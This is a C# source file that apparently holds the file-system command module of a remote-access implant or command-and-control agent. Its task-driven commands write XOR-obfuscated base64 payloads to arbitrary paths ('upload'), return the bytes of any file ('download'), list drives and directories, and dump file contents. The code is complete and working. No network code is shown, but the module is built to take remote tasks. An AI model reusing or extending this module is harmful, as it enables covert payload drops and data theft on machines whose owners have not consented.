using System;
using System.IO;
using System.Text;

namespace FileSystem
{
    public class UploadCommand
    {
        public string Name => "upload";
        public dynamic DotsProperty { get; set; }

        public string Execute(dynamic task)
        {
            byte[] upstream_data = Zor(Convert.FromBase64String(task.Params[0]), task.Params[1]);
            string upload_path = task.Params[2];
            File.WriteAllBytes(upload_path, upstream_data);
            return "Wrote " + upstream_data.Length.ToString() + " bytes to: " + upload_path;
        }

        private byte[] Zor(byte[] input, string key)
        {
            int _key = Int32.Parse(key);
            byte[] mixed = new byte[input.Length];
            for (int i = 0; i < input.Length; i++)
            {
                mixed[i] = (byte)(input[i] ^ _key);
            }
            return mixed;
        }
    }

    public class DownloadCommand
    {
        public string Name => "download";
        public dynamic DotsProperty { get; set; }

        public byte[] Execute(dynamic task)
        {
            string download_path = task.Params[0];
            byte[] result = File.ReadAllBytes(download_path);
            return result;
        }
    }

    public class DrivesCommand
    {
        public string Name => "drives";
        public dynamic DotsProperty { get; set; }

        public string Execute(dynamic task)
        {
            StringBuilder result = new StringBuilder();

            foreach (DriveInfo objDrive in DriveInfo.GetDrives())
            {
                try
                {
                    result.AppendLine($"Drive {objDrive.Name}");
                    result.AppendLine($"Volume Label: {objDrive.VolumeLabel}");
                    result.AppendLine($"{objDrive.DriveFormat} drive");
                    result.AppendLine($"Total size: {Math.Round(objDrive.TotalSize / 1000000000.0, 2)} GB");
                    result.AppendLine($"Free space: {Math.Round(objDrive.TotalFreeSpace / 1000000000.0, 2)} GB");
                    result.AppendLine();
                }
                catch (UnauthorizedAccessException)
                {
                    result.AppendLine("Permission denied");
                }
            }

            return result.ToString();
        }
    }

    public class DirCommand
    {
        public string Name => "dir";
        public dynamic DotsProperty { get; set; }

        public string Execute(dynamic task)
        {
            StringBuilder result = new StringBuilder();
            string directory = Directory.GetCurrentDirectory();
            if (task.Params.Length > 0)
            {
                directory = task.Params[0];
            }

            result.AppendLine($" Directory of {directory}");
            string[] directories;

            directories = Directory.GetDirectories(directory);


            foreach (string dir in directories)
            {
                try
                {
                    DirectoryInfo dirInfo = new DirectoryInfo(dir);
                    string date = dirInfo.LastWriteTime.ToString("MM/dd/yyyy  hh:mm tt");
                    result.AppendLine($"{date}    <DIR>          {dirInfo.Name}");
                }
                catch (UnauthorizedAccessException)
                {
                    result.AppendLine($"Permission Denied: {dir}");
                }
            }

            string[] files;
            files = Directory.GetFiles(directory);

            foreach (string file in files)
            {
                try
                {
                    FileInfo fileInfo = new FileInfo(file);
                    string date = fileInfo.LastWriteTime.ToString("MM/dd/yyyy  hh:mm tt");
                    result.AppendLine($"{date}    {fileInfo.Length,15:N0} {fileInfo.Name}");
                }
                catch (UnauthorizedAccessException)
                {
                    result.AppendLine($"Permission Denied: {file}");
                }
            }

            return result.ToString();
        }
    }

    public class TypeCommand
    {
        public string Name => "type";
        public dynamic DotsProperty { get; set; }

        public string Execute(dynamic task)
        {
             return File.ReadAllText(task.Params[0]);
        }
    }

    public class PwdCommand
    {
        public string Name => "pwd";
        public dynamic DotsProperty { get; set; }

        public string Execute(dynamic task)
        {
            return Directory.GetCurrentDirectory();
        }
    }
}
